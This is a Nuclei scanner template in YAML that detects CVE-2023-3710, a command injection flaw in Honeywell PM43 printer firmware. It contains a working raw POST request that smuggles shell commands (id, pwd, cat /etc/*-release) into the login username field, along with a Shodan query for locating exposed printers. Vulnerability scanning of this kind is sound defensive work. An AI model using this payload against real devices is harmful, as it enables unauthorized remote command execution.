http:
- matchers:
  - part: body
    regex:
    - uid=([0-9(a-z)]+) gid=([0-9(a-z)]+) groups=([0-9(a-z)]+)
    type: regex
  - part: body
    type: word
    words:
    - Release date
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /loadfile.lp?pageid=Configure HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    username=x%0aid;pwd;cat+/etc/*-release%0a&userpassword=1

    '
id: CVE-2023-3710
info:
  author: win3zz
  classification:
    cpe: cpe:2.3:o:honeywell:pm43_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-3710
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-77,CWE-20
    epss-percentile: 0.97883
    epss-score: 0.75328
  description: 'Improper Input Validation vulnerability in Honeywell PM43 on 32 bit,
    ARM (Printer web page modules) allows Command Injection.This issue affects PM43
    versions prior to P10.19.050004. Update to the latest available firmware version
    of the respective printers to version MR19.5 (e.g. P10.19.050006)

    '
  metadata:
    max-request: 1
    product: pm43_firmware
    shodan-query: http.html:"/main/login.lua?pageid="
    vendor: honeywell
    verified: true
  name: Honeywell PM43 Printers - Command Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-3710
  - https://github.com/vpxuser/CVE-2023-3710-POC
  - https://twitter.com/win3zz/status/1713451282344853634
  - https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwaresignedP1019050004
  - https://hsmftp.honeywell.com:443/en/Software/Printers/Industrial/PM23-PM23c-PM43-PM43c/Current/Firmware/firmwarexasignedP1019050004A
  severity: critical
  tags: cve2023,cve,honeywell,pm43,printer,iot,rce
